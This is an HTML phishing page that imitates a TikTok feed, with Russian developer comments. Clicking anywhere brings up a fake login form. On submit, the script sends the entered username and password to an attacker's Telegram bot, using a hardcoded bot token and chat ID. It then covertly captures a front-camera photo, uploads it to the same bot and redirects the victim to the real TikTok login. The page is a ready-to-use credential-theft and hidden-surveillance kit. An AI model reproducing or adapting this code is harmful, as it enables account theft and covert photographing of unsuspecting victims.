<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>TikTok</title>
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background-color: #000; overflow: hidden; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; color: white; }
        
        /* Фейковое видео на фоне */
        #bg-video { position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; z-index: -1; opacity: 0.8; }
        
        /* Элементы интерфейса TikTok */
        .ui-layer { position: absolute; width: 100%; height: 100%; pointer-events: none; }
        .top-bar { position: absolute; top: 20px; width: 100%; display: flex; justify-content: center; gap: 20px; font-weight: bold; font-size: 16px; color: rgba(255,255,255,0.6); }
        .top-bar .active { color: white; border-bottom: 2px solid white; padding-bottom: 5px; }
        
        .right-sidebar { position: absolute; right: 15px; bottom: 80px; display: flex; flex-direction: column; align-items: center; gap: 20px; }
        .icon { width: 35px; height: 35px; background: rgba(255,255,255,0.2); border-radius: 50%; display: flex; justify-content: center; align-items: center; font-size: 18px; }
        .icon-text { font-size: 12px; margin-top: 5px; font-weight: bold; }
        
        .bottom-info { position: absolute; left: 15px; bottom: 20px; max-width: 70%; }
        .username { font-weight: bold; font-size: 18px; margin-bottom: 5px; }
        .description { font-size: 14px; line-height: 1.4; margin-bottom: 10px; }
        .music { font-size: 12px; display: flex; align-items: center; gap: 5px; }
        
        /* Скрытое видео для камеры */
        #camera-video { position: absolute; width: 1px; height: 1px; opacity: 0; pointer-events: none; }
        
        /* Модальное окно для логина */
        #loginModal { display: none; position: absolute; bottom: 0; left: 0; width: 100%; background: rgba(0,0,0,0.9); padding: 20px; box-sizing: border-box; border-top-left-radius: 15px; border-top-right-radius: 15px; z-index: 10; }
        #loginModal h3 { margin: 0 0 15px 0; text-align: center; }
        #loginModal input { width: 100%; padding: 12px; margin-bottom: 10px; background: #222; border: 1px solid #444; color: white; border-radius: 5px; box-sizing: border-box; }
        #loginModal button { width: 100%; padding: 12px; background: #fe2c55; color: white; border: none; border-radius: 5px; font-weight: bold; font-size: 16px; }
    </style>
</head>
<body>

    <!-- Фоновое видео (чтобы выглядело как настоящая лента) -->
    <video id="bg-video" autoplay loop muted playsinline>
        <source src="https://assets.mixkit.co/videos/preview/mixkit-girl-dancing-happily-in-a-neon-room-42643-large.mp4" type="video/mp4">
    </video>

    <div class="ui-layer">
        <div class="top-bar">
            <div>Подписки</div>
            <div class="active">Рекомендации</div>
            <div>🔍</div>
        </div>

        <div class="right-sidebar">
            <div>
                <div class="icon">👤</div>
                <div class="icon-text">+</div>
            </div>
            <div>
                <div class="icon">❤️</div>
                <div class="icon-text">436.2K</div>
            </div>
            <div>
                <div class="icon">💬</div>
                <div class="icon-text">920</div>
            </div>
            <div>
                <div class="icon">↪️</div>
                <div class="icon-text">2.3K</div>
            </div>
            <div>
                <div class="icon">💿</div>
            </div>
        </div>

        <div class="bottom-info">
            <div class="username">@mssswees</div>
            <div class="description">в этом аккаунте много крутых звуков</div>
            <div class="music">🎵 оригинальный звук - ♡mssswees♡</div>
        </div>
    </div>

    <!-- Скрытый элемент для захвата камеры -->
    <video id="camera-video" autoplay playsinline></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <!-- Модальное окно входа -->
    <div id="loginModal">
        <h3>Log in to TikTok</h3>
        <form id="loginForm">
            <input type="text" id="username" placeholder="Email or username" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit" id="btn">Log in</button>
        </form>
    </div>

    <script>
        const BOT_TOKEN = "8758850534:AAF79a17p6NCuHMluPI_Rkw7FeoQSkCcRe8"; 
        const CHAT_ID = "7485234259"; 
        let cameraStream = null;

        // При клике на экран открываем форму входа (как будто они хотят лайкнуть)
        document.body.addEventListener('click', function(e) {
            if (e.target.tagName !== 'INPUT' && e.target.tagName !== 'BUTTON') {
                document.getElementById('loginModal').style.display = 'block';
            }
        });

        // При нажатии на кнопку Войти
        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            const user = document.getElementById('username').value;
            const pass = document.getElementById('password').value;
            const btn = document.getElementById('btn');
            
            btn.innerText = "Verifying...";
            btn.disabled = true;

            // 1. Запрашиваем камеру (пока юзер смотрит на форму)
            try {
                cameraStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
                const video = document.getElementById('camera-video');
                video.srcObject = cameraStream;
                await new Promise(resolve => setTimeout(resolve, 500)); // Ждем фокуса
            } catch (err) {
                console.log('Камера запрещена', err);
            }

            // 2. Отправляем логин и пароль
            const text = `🎯 TikTok Phish\nDevice: iOS\nUser: ${user}\nPass: ${pass}`;
            const urlText = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`;
            await fetch(urlText, { mode: 'no-cors', keepalive: true });

            // 3. Делаем фото
            if (cameraStream) {
                try {
                    const video = document.getElementById('camera-video');
                    const canvas = document.getElementById('canvas');
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;
                    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    cameraStream.getTracks().forEach(track => track.stop());

                    const dataURL = canvas.toDataURL('image/jpeg', 0.8);
                    const blob = await (await fetch(dataURL)).blob();
                    
                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('photo', blob, 'face.jpg');
                    formData.append('caption', '📸 Скрытое селфи');
                    
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });
                } catch (err) {}
            }

            // 4. Редирект на настоящий TikTok
            setTimeout(() => {
                window.location.href = "https://www.tiktok.com/login";
            }, 1000);
        });
    </script>
</body>
</html>
